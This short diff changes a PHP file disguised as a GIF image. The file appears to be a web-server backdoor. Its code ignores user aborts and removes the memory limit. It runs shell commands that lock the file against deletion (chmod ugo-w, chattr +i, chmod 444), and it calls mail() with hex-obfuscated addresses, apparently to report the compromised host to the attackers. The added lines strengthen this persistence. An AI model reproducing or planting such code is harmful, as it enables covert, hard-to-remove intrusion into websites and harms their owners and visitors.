@@ -1,4 +1,10 @@
 GIF8a;
+
+<?php 
+}
+exit;
+?>
+<?php endif; ?>
 <?php
 ignore_user_abort(true);
 ini_set("memory_limit", "-1");
@@ -10,6 +16,10 @@ $㾦ゼセ㵁 = __FILE__;
 @system("chmod ugo-w $㾦ゼセ㵁");
 @system("chattr +i $㾦ゼセ㵁");
 @system("chmod +i $㾦ゼセ㵁");
+$👾👾👾 = __FILE__;
+system("chmod ugo-w $👾👾👾");
+system("chattr +i $👾👾👾");
+system("chmod 444 $👾👾👾");
 @mail(
     "pa\x70\x61ku.\x68\x61yk\x65\x72\x40\x67mail.co\x6d,\x20\x72oo\x74cyber\x70unk\x73\x40g\x6d\x61il.\x63o\x6d",
     "\x77eb",
